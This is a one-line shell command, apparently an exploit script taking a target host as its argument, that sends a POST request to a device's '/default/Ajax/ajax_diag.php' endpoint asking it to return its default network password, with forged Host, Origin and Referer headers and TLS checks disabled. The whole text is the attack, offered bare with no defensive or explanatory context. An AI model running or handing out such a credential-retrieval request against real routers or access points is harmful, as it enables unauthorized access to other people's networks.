curl -i -s -k -X "POST"  -H "Host: $1" -H "Origin: http://$1" -H "Referer: http://$1/default.php"  --data-binary "cmd=GetNetworkSafepasswordDefault_ap"  "http://$1/default/Ajax/ajax_diag.php" 
